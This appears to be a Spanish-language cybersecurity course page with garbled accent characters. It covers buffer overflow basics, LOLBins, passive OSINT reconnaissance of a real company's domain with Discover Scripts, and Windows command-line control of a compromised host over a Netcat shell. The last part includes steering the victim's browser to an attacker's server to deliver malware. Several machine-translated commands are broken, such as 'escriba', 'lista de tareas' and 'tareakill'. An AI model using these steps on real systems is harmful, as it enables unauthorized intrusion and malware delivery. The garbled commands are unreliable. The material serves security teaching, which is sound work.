### **¬øC√≥mo utilizar los errores de desbordamiento del b√∫fer de una forma diferente?**

Generalmente, la explotaci√≥n de estos errores puede conducir a:

- aplicaci√≥n DoS
- reordenar la ejecuci√≥n de funciones
- ejecuci√≥n de c√≥digo (si podemos inyectar el c√≥digo shell, descrito en el documento separado)

### **¬øC√≥mo se cometen los errores de desbordamiento del b√∫fer?**

Este tipo de errores son muy f√°ciles de cometer. Durante a√±os fueron la pesadilla de un programador. El problema radica en las funciones nativas de C, a las que no les importa realizar comprobaciones adecuadas de la longitud del b√∫fer. A continuaci√≥n se muestra la lista de dichas funciones y, si existen, sus equivalentes seguros:

- gets() -\> fgets()- leer caracteres
- strcpy() -\> strncpy()- copiar el contenido del buffer
- strcat() -\> strncat()- concatenaci√≥n de buffer
- sprintf() -\> snprintf()- llenar el b√∫fer con datos de diferentes tipos
- (f)scanf()- leer desde STDIN
- getwd()- volver al directorio de trabajo
- realpath()- devolver la ruta absoluta (completa)

Utilice funciones equivalentes seguras, que verifiquen la longitud de los buffers, siempre que sea posible. A saber:

1. gets() -\> fgets()
2. strcpy() -\> strncpy()
3. strcat() -\> strncat()
4. sprintf() -\> snprintf()

Aquellas funciones que no tienen equivalentes seguros deben reescribirse implementando comprobaciones seguras. El tiempo dedicado a ello se beneficiar√° en el futuro. Recuerda que tienes que hacerlo s√≥lo una vez.¬† Utilice compiladores, que sean capaces de identificar funciones inseguras, errores l√≥gicos y comprobar si la memoria se sobrescribe cuando y donde no deber√≠a estar.

### **Explotaciones de aplicaciones web: c√≥mo los piratas inform√°ticos aprovechan las vulnerabilidades de desbordamiento del b√∫fer**

En el navegador web **Firefox** , busque la siguiente URL:

[https://demo.testfire.net](https://demo.testfire.net/)

Esta es una aplicaci√≥n web deliberadamente vulnerable que se utiliza con fines educativos y de prueba. Seleccione Iniciar sesi√≥n e inicie sesi√≥n en la aplicaci√≥n utilizando las siguientes credenciales:

Nombre de usuario ‚Üí admin

Contrase√±a ‚Üí admin

Haga clic en el enlace **Feedback** junto a la barra de b√∫squeda en la esquina superior derecha.

![Buffer 5](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer5.png?raw=true)

La aplicaci√≥n no realiza una verificaci√≥n de longitud y es vulnerable a ataques de desbordamiento.

Si un atacante env√≠a m√°s datos de los que el b√∫fer puede contener, el exceso de datos se desbordar√° hacia √°reas de memoria adyacentes, sobrescribiendo potencialmente datos cr√≠ticos o el c√≥digo de la aplicaci√≥n. Esto puede provocar un comportamiento impredecible y potencialmente malicioso.

Scripting para Red Team

# **LOLBAS: colecci√≥n de scripts para ataques en Red Team**

Distintos investigadores y hackers se han propuesto construir una lista de **[LOLBins](https://lolbas-project.github.io/)**, programas leg√≠timos de los cuales se puede abusar para evitar la seguridad y evadir la detecci√≥n. Estos programas pueden serr utilizados por equipos de Red Team o directamente por atacantes en malware, APTs y en situaciones de escalamiento de privilegios y ataques laterales.

La confianza es uno de los pilares clave en los que se basa la seguridad de la informaci√≥n. En √∫ltima instancia, lo que determina qui√©n tiene acceso a qu√©, qu√© aplicaciones pueden ejecutarse y cu√°les no. ¬øPero qu√© pasa cuando se abusa de esa confianza? Por ejemplo, cuando aplicaciones autorizadas y confiables son utilizadas por atacantes.

Los LOLBins son un buen ejemplo de la explotaci√≥n de confianza: son binarios "confiables" que un atacante puede usar para realizar acciones distintas de aquellas para las que originalmente fueron dise√±ados. Como tal, los LOLBins hacen posible que los atacantes eviten las contramedidas defensivas, como la inclusi√≥n en la lista blanca de aplicaciones, el monitoreo de seguridad y el software antivirus con una menor posibilidad de ser detectados. Un ejemplo, se puede [usar el comando print.exe](https://www.youtube.com/watch?v=nPBcSP8M7KE) para copiar un archivo a un Alternate Data Stream (ADS) y luego ejecutarlo.

![Buffer 6](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer6.png?raw=true)

## **[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) ("Living Off the Land Binaries and Scripts")**

Actualmente, hay m√°s de 130 LOLBins, LOLLibs y LOLScripts en la lista, que van desde la herramienta de transferencia de datos leg√≠tima de Microsoft *Bitsadmin.exe* hasta *print.exe*. La lista incluye programas que han documentado un potencial de abuso, as√≠ como una variedad de programas que ya se han convertido en herramientas favoritas para recuperar cargas √∫tiles de malware durante ataques del mundo real, incluidos *mshta.exe, certutil.exe* y *regsvr32.exe*.

*Tener una buena documentaci√≥n sobre estos binarios y scripts puede ayudar a todos a prevenir ataques al bloquear activamente su ejecuci√≥n. Si sabes que algo puede ser usado para el mal, hace que el trabajo sea mucho m√°s f√°cil cuando buscas ataques e intentas prevenirlos. Despu√©s de todo, los actores de amenaza de persistencia avanzada (APT) ya est√°n usando estos binarios / scripts como parte de sus ataques. Por lo tanto, debemos profundizar en todos los archivos y descubrir formas inteligentes en que podamos usar esta lista antes de que lo hagan los atacantes.*

LOLBAS funciona como una lista din√°mica mantenida por la comunidad. Cualquier persona interesada en realizar una investigaci√≥n de seguridad para enviar nuevos LOLBins es alentada a hacerlo y ser reconocida por ello. La lista actual es solo el comienzo y se espera poder proporcionar una lista de b√∫squeda en un formato de base de datos para el servicio, asignarla al marco [MITRE ATT & CK](https://attack.mitre.org/wiki/Main_Page) y agregar m√°s datos en cada registro de LOLBin y LOLScript, incluida la informaci√≥n sobre su detecci√≥n y las t√©cnicas de bloqueo relevantes.

### **GTFOBins**

[GTFOBins](https://gtfobins.github.io/) es una lista inspirada en LOBAS pero con binarios de Unix/Linux que pueden ser explotados por un atacantes para saltear restricciones de seguridad locales.

### **Offensive-PowerShell**

[Offensive-PowerShell](https://github.com/1RicardoTavares/Offensive-PowerShell) es un repositorio de Github contiene un recopilatorio de *scripts* en Powershell para operaciones ofensivas relacionadas con tareas de Red Teaming. Se describen c√≥mo funciona cada uno y dan un peque√±o tutorial en ingl√©s sobre c√≥mo usarlos, adem√°s de decir con qu√© versiones de Windows son compatibles.

## **Automatizando el Reconocimiento de un Red Team con Discover Scripts**

Cuando hablamos de Red Team el alcance del mismo, no s√≥lo abarca a las tecnolog√≠as sino tambi√©n a las personas y procesos. Otra cosa que ya hemos mencionado m√°s de una vez es que, a diferencia de un pentest tradicional, el cual mucho m√°s acotado en tiempo y alcance, un servicio de red team justamente es much√≠simo m√°s amplio tanto en su ventana de tiempo de ejecuci√≥n como en su alcance ya que, entre otras cosas se trata de generar la mayor cantidad de escenarios posibles o incluso replicar campa√±as de APT conocidas, lo cual brinda como resultado un resultado mucho m√°s hol√≠stico en relaci√≥n a la postura de seguridad de una determinada compa√±√≠a o entidad.

Aclarado el contexto, est√° claro que la fase de reconocimiento en el mundo del Red Team, a diferencia justamente de un pentest tradicional, es de vital importancia. Justamente, cuando hablamos de reconocimiento, hablamos de OSINT en todos sus aspectos o lo que se suele llamar tradicionalmente como information gathering pasivo y activo. Dado que justamente en un ejercicio de red team se suele modelar con much√≠simo m√°s tiempo un escenario de ataque.

Mientras m√°s tiempo le dediquemos a esta fase m√°s van a ser los vectores de ataque que se puedan utilizar para realizar un ataque exitoso, desde bucket de AWS, servicios que no necesariamente deber√≠an estar expuestos (RDP por ejemplo), paneles de gesti√≥n web, posibles cuentas de github en donde los desarrolladores de la compa√±√≠a guardan c√≥digo de la misma, etc. En un ejercicio de Red Team todo y absolutamente todo lo que se encuentre puede ser un expuesto a vulnerar.

Veremos una herramienta de tipo ¬´all in one¬ª que no suele realmente ser muy conocida pero que lleva varios a√±os La herramienta se llama ¬´Discover Scripts¬ª de Lee Baird @discoverscripts ([https://github.com/leebaird/discover](https://github.com/leebaird/discover)) y antes era conocida c√≥mo Backtrack Scripts, se imaginar√°n porque‚Ä¶.pues porque la misma era parte de la suite de herramientas de Backtrack Kali Linux antes de convertirse en Kali Linux.

Esta herramienta o conjunto de scripts, yo la uso mucho en lo particular y lo interesante es que tambi√©n se puede usarse para otras cuestiones no tan relativas a OSINT sino que a trav√©s de la misma se pueden disparar otras tools como Recon-NG o por ejemplo Nikto para un escaneo web.

Discover Scripts, c√≥mo su nombre indica, es un conjunto de scripts que disparan acciones o herramientas. Utiliza herramientas c√≥mo ¬´dnsrecon, goofile, goog-mail, goohost, theharvester, metasploit, urlcrazy, whois, wikto y varias otras.

## Instalaci√≥n

Para instalarla solo deberemos clonar el repositorio desde su sitio oficial git clone.

![Buffer 7](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer7.png?raw=true)

Una vez finalizada la instalaci√≥n deberemos movernos al directorio /opt/discover que es d√≥nde se instala por default. Lo primero que deberemos hacer ahora es correr el script bash de actualizaci√≥n de la herramienta el cual ./update.sh.

![Buffer 8](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer8.png?raw=true)

Al disparar el script la herramienta empezar√° a instalar no solamente los componentes necesarios, sino que, adem√°s, la misma instalar√° muchas otras herramientas de las que se vale para hacer las diferentes b√∫squedas que hace e incluso herramientas ofensivas como impacket y muchas otras. El proceso de instalaci√≥n lleva un tiempo largo con lo cual sugerimos un poco de paciencia e ir siguiendo el paso a paso de la instalaci√≥n con un caf√©.

## Ejecuci√≥n de la herramienta

Una vez finalizada 100% la instalaci√≥n y actualizaci√≥n de todos los componentes, y est√°ndo parados en el directorio de la misma ya podemos empezar a utilizar la herramienta, para hacerlo s√≥lo debemos correr el script ./discover.sh con el comando sudo por delante, excepto que estemos trabajando con la cuenta de root en forma directa.

![Buffer 9](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer9.png?raw=true)

Al disparar el script nos aparecer√° la siguiente pantalla:

![Buffer 10](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer10.png?raw=true)

C√≥mo podemos ver la herramienta tiene varias opciones que no solamente est√°n limitadas al ¬´Reconocimiento¬ª sino que puede invocar escaneos de puertos (port scanning) con nmap o incluso escaneos web con Nikto, por s√≥lo mencionar algunas de las opciones.

Recomendados mirar el sitio web de github de Lee Baird para ver la documentaci√≥n del uso ya que es bastante extensivo todo lo que se puede realizar con la herramienta. En nuestro caso, y dado que estamos hablando de ¬´Reconocimiento¬ª en el marco de un Red Team Engagement, trabajaremos solamente con la opci√≥n de ¬´RECON¬ª.

Entonces vamos a marcar dentro de RECON la opci√≥n 1 llamada Domain, para eso solo tipeamos el n√∫mero 1 en la consola y le damos enter y nos aparecer√° el siguiente men√∫ que se observa:

![Buffer 11](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer11.png?raw=true)

En este caso, vamos a trabajar con la opci√≥n 1 llamada ¬´Passive¬ª dado que queremos recolectar la mayor cantidad de informaci√≥n en forma 100% pasiva sin que la actividad en s√≠, pueda ser detectada de alguna forma u otra.

**NOTA**: Si tipeamos la opci√≥n ¬´Active¬ª la b√∫squeda utilizar√° m√≥dulos de herramientas c√≥mo dnsrecon, WAF00W, traceroute, Whatweb, and recon-ng, los cuales no son pasivos y podr√≠an detectar nuestra actividad y que nuestra IP sea baneada. Vamos a tomar un dominio v√°lido ya que, en principio, no estamos haciendo absolutamente nada m√°s que recolectar informaci√≥n. Para ellos voy a usar el dominio de ¬†[https://www.nintendo.com/](https://www.nintendo.com/).

Para ello entonces, luego de seleccionar la opci√≥n 1 de ¬´Passive¬ª como ya dijimos antes, nos va a pedir que ingresemos el nombre de la compa√±√≠a (Esto sirve para el nombre del reporte que la herramienta va a crear una vez que termine) y por otro lado el nombre del domino, el cual deber√° ingresarse con el formato ¬´dominio.com¬ª es decir sin www ni http. En nuestro caso ¬´Nintendo.com¬ª

![Buffer 12](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer12.png?raw=true)

Si prestamos atenci√≥n podemos ver la imagen que la herramienta nos dice que va a utilizar entre otras herramientas ARIN, DNSRecon, dnstwist, TheHarvester, recon-ng, y varias m√°s e inclusive nos indica que si queremos generar APIs para maximizar el resultado lo hagamos, lo cual recomendamos tanto para BING, Google CSE, Shodan, Censys, etc.

Las APIs que hayamos generado se pueden cargar en las diferentes herramientas que se utilizan, en este caso por sobre todo recon-ng y theharvester, con lo cual las APIs se cargar√≠an de la siguiente manera:

> En recon-ng se puede usar el comando ¬´show keys¬ª y luego ingresar las APIs con el comando ¬´keys add¬ª, ejemplo: ¬´keys add bing_api <valor de api>¬ª.
> 

Una vez que le damos ¬´enter¬ª la herramienta empieza a correr con lo cual ac√° recomendamos otro cafecito. Veremos que arranca corriendo y haciendo diferentes querys a trav√©s de variadas tools:

![Buffer 13](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer13.png?raw=true)

Una vez que la herramienta termina de trabajar nos va a decir ¬´Scan Complete¬ª y nos va a mostrar en que ruta se guarda el archivo, en este caso dentro de /root/data/Nintendo.com que es el dominio que especificamos.

![Buffer 14](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer14.png?raw=true)

Desde una consola como root entonces disparamos el Firefox al archivo index.html generado dentro de /root/data/Nintendo.com/ y veremos en el navegador lo siguiente:

![Buffer 15](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer15.png?raw=true)

Podemos observar en la pantalla que se nos generan varios tabs en d√≥nde tenemos el de ¬´Home¬ª, ¬´General¬ª, ¬´DNS¬ª, ¬´Domain¬ª, ¬´File¬ª, ¬´Reports¬ª y ¬´Web¬ª. En general vamos a poder encontrar listado de usuarios y correos electr√≥nicos que despu√©s se puede usar dicho listado para crear un diccionario customizado aunque hay que validar mucha de esta informaci√≥n.

Sugerimos que esto se haga directamente buscando informaci√≥n en el sitio oficial de la empresa u entidad que se est√© mirando en ese momento como a trav√©s de t√©cnicas de scrapping por ejemplo de Linkedin de los usuarios de dicha compa√±√≠a (Cosa que veremos m√°s adelante en otra entrada). En el caso de DNS es d√≥nde empezamos a ver los mapas y registros de DNS perteneciente a la empresa o entidad, c√≥mo por ejemplo se puede ver a continuaci√≥n.

![Buffer 16](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer16.png?raw=true)

![Buffer 17](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer17.png?raw=true)

Tambi√©n podremos ver dentro de este contexto otros dominios DNS registrados por la compa√±√≠a, en este caso utilizados como mail corporativo.

![Buffer 18](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer18.png?raw=true)

Tambi√©n los sub dominios, que en este caso particular podemos ver que son muchos dados que es una empresa o compa√±√≠a extremadamente grande.

En el tab de ¬´Files¬ª podemos ver que la herramienta nos muestra todos los archivos que est√°n p√∫blicos, en este caso seleccionamos la opci√≥n PDF de entre todos los que nos brinda. Esto es extremadamente √∫til ya que podr√≠amos complementariamente bajar muchos de estos archivos con herramientas c√≥mo Foca o metagoofil para poder extraer adicionalmente otros datos de utilidad a trav√©s de la metadata de los mismos.

![Buffer 19](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer19.png?raw=true)

Por √∫ltimo (Al menos en lo que este post se refiere) podemos ver tambi√©n que, cuando nos dirigimos al tab ¬´Reports¬ª se nos despliegan muchas dos opciones de las cuales una es la de ¬´Active Recon¬ª y la segunda la de ¬´Passive Recon¬ª. En este caso y dado que desde el principio s√≥lo corrimos un Passive Recon para la opci√≥n ¬´Domain¬ª, est√° ser√° la opci√≥n que se seleccionaremos. Al hacerlo veremos que nos muestra un res√∫men pormenorizado de todo lo que encontr√≥ en una forma s√∫per √∫til para seguir.

![Buffer 20](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer20.png?raw=true)

![Buffer 21](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer21.png?raw=true)

## Conclusiones

Esta herramienta junto con el uso de recon-ng en forma automatizada, yo la uso mucho para recolectar informaci√≥n. C√≥mo toda herramienta de ¬´bot√≥n gordo¬ª ayuda mucho a automatizar y recolectar mucha informaci√≥n en un lapso mucho menor que la b√∫squeda meramente manual, no obst√°nte hay que recordar que:

- Muchos de los datos se deben Re validar manualmente
- Que la parte de datos de casillas de correo y de personas conviene sacarlos por otro medio o por algunos m√≥dulos espec√≠ficos de recon-ng que ya veremos m√°s adelante o mismo por scrapping.
- Que se debe utilizar si o si tanto en recon-ng c√≥mo en la herramienta de ¬´TheHarvester¬ª las APIs que ya previamente tengamos registradas (Shodan, Censys, Bing, GoogleCSE, Virustotal, etc.) ya que va a ser mucho m√°s rica la b√∫squeda que nos genere la herramienta.

Recordemos adem√°s que la herramienta puede automatizar escaneos activos, automatizar el uso de metasploit a trav√©s de m√≥dulos que invoca, automatizar escaneos web con nikto y muchas cosas m√°s ya que, adem√°s de la automatizaci√≥n de muchas de las herramientas que ya mencionamos al principio tambi√©n en el caso de su uso en Kali Linux utiliza y automatiza el ¬´Penetration Tester Framework¬ª (PTF).

Espero que les haya gustado la nota. Happy hacking!

### Recurso Bibliogr√°fico

[https://github.com/leebaird/discover](https://github.com/leebaird/discover)

## **Comandos CMD remotos de Windows para hackear**

Muchos hackers nuevos provienen de Windows, pero rara vez (o nunca) utilizan sus herramientas de l√≠nea de comandos integradas. Como hacker, a menudo se ver√° obligado a controlar el sistema de destino utilizando s√≥lo comandos de Windows y sin GUI.

Aunque nos encantar√≠a tener Meterpreter de Metasploit en el objetivo y utilizar todas sus capacidades en el sistema propio, eso no siempre es posible. Algunos exploits s√≥lo nos permitir√°n obtener un shell CMD en el sistema Windows de destino.

En estos casos, necesitar√° comprender c√≥mo controlar el sistema estrictamente a trav√©s del s√≠mbolo del sistema, sin tener nunca la comodidad y familiaridad de la GUI de Windows.

Lo que quiero hacer en este tutorial es demostrar algunos comandos de Windows en un sistema Windows. Ejecutar√© los comandos de Windows desde un sistema Kali remoto en el objetivo.

### **Paso 1: Con√©ctese a un sistema Windows remoto desde Kali**

Windows hace una distinci√≥n entre comandos que se pueden ejecutar f√≠sicamente en el sistema y aquellos que se pueden ejecutar de forma remota. No podemos asumir que un comando que podemos ejecutar mientras estamos en el sistema se ejecutar√° de forma remota.

Aqu√≠ s√≥lo nos interesan aquellos que se pueden ejecutar de forma remota. En mi caso, me conectar√© al sistema de destino con una conexi√≥n Netcat, pero un shell de comandos generado por Metasploit u otro funcionar√° igual de bien.

### **Paso 2: comandos b√°sicos**

En muchos sentidos, los comandos CMD de Windows son similares a los comandos de Linux/Unix (Unix precedi√≥ a estos comandos por m√°s de una d√©cada, y Microsoft tom√≥ mucho prestado de √©l). En su forma m√°s b√°sica, necesitamos cambiar directorios dentro del sistema de archivos. Al igual que Linux, Windows utiliza el comando **cd** (cambiar directorio). Para viajar a la ra√≠z del sistema de directorios, simplemente podemos escribir:

**`cd \`**

Adem√°s, podemos subir un nivel en la estructura del directorio escribiendo:

**`cd ..`**

![Buffer 21](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer21.png?raw=true)

Si queremos ver el contenido de un directorio, escribimos **dir** como se ve arriba. Algunos otros comandos clave y b√°sicos incluyen:

**`del <nombre de archivo>`**

Esto eliminar√° el archivo, similar a Linux **rm** .

**`escriba <nombre de archivo>`**

Esto mostrar√° el contenido del archivo, similar al **cat** de Linux .

Como puede ver a continuaci√≥n, utilic√© el tipo de letra para mostrar el contenido del archivo confidencial.txt. Luego **elimino** el archivo confidencial.txt y, cuando vuelvo a mostrar su contenido, aparece el mensaje "El sistema no puede encontrar el archivo especificado".

![Buffer 22](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer22.png?raw=true)

Para crear un nuevo directorio, usamos el comando **md** (crear directorio) (en Linux, es mkdir). Para crear un directorio llamado "nuevodirectorio", escribimos:

**`md nuevo directorio`**

![Buffer 23](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer23.png?raw=true)

Despu√©s de crear un nuevo directorio, ahora podemos ejecutar **dir** y ver el nuevo directorio que creamos.

**`Paso 3: comandos de red`**

Cuando estamos en el sistema remoto, es posible que necesitemos informaci√≥n de red. Para ello disponemos de dos comandos b√°sicos, **ipconfig** y **netstat** . ipconfig es muy similar a **ifconfig** de Linux , como se ve a continuaci√≥n.

![Buffer 24](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer24.png?raw=true)

Para ver las conexiones de red del sistema, podemos escribir **netstat** , tal como en Linux.

**netstat**

![Buffer 25](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer25.png?raw=true)

### **Paso 4: Ver procesos**

A menudo, cuando estamos en un sistema remoto, necesitaremos ver una lista de los procesos en ejecuci√≥n. Desde la GUI, por supuesto, podemos usar el Administrador de tareas (Ctrl + Alt + Supr), pero desde el s√≠mbolo del sistema remoto usamos la **lista de tareas** .

**lista de tareas**

![Buffer 26](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer26.png?raw=true)

Si queremos encontrar un solo proceso, podr√≠amos usar el filtro **findtr** (buscar cadena). Esto funciona de manera similar a **grep** en Linux. Entonces, para encontrar el proceso llamado "explorador", podr√≠amos escribir:

**lista de tareas | explorador findtr**

![Buffer 27](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer27.png?raw=true)

Tenga en cuenta que utilizamos la canalizaci√≥n (|), al igual que en Linux, para enviar los resultados del comando de **lista de tareas** al comando de filtrado, **findstr** .

Si quiero finalizar un proceso, puedo usar el comando taskkill. Requiere el PID (ID de proceso) del proceso que queremos eliminar. En este caso, el proceso del explorador tiene un PID de 1532, as√≠ que para finalizarlo, puedo escribir:

**tareakill /PID 1532 /F**

![Buffer 28](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer28.png?raw=true)

Donde **/F** significa "forzar la muerte".

### **Paso 5: busque las cuentas de usuario**

Si queremos ver los usuarios en el sistema de destino, podemos escribir:

**usuarios de la red**

![Buffer 29](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer29.png?raw=true)

Como puede ver, este sistema tiene tres usuarios: invitado, administrador y v√≠ctima, con el nombre apropiado.

### **Paso 6: ejecute un navegador en el destino**

Mientras operamos el sistema desde el s√≠mbolo del sistema, podemos ejecutar algunas aplicaciones, como por ejemplo el navegador web. Internet Explorer se llama **iexplore** (puede no estar disponible en versiones de windows m√°s modernas) en el s√≠mbolo del sistema y podemos encontrarlo en "Archivos de programa" con la versi√≥n de 64 bits o en "Archivos de programa (x86)" con la versi√≥n de 32 bits. Entonces, si quiero abrir Internet Explorer en el sistema remoto desde el s√≠mbolo del sistema y abrir **Wonderhowto.com ,**escribir√≠a:

Iexplore [www.google.com](http://www.google.com/)

Cuando lo hacemos, esto abre Internet Explorer en el sistema de destino y va a **google.com**. Esto podr√≠a ser realmente √∫til si ten√≠a configurado un enlace XSS malicioso o deseaba utilizar **el m√≥dulo de entrega web de Metasploit** y necesitaba que el objetivo fuera a un servidor web.

Adem√°s, es posible que queramos que el sistema de destino vaya a nuestro servidor web en Kali. Podr√≠amos iniciar el servidor web Apache y luego dirigir el sistema de destino a nuestro servidor web donde podemos tener alg√∫n software malicioso.

Podemos escribir:

Iexplore **<direcci√≥n IP>**

Como puede ver a continuaci√≥n, hemos dirigido el sistema de destino a nuestro servidor web en Kali.

![Buffer 29](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer29.png?raw=true)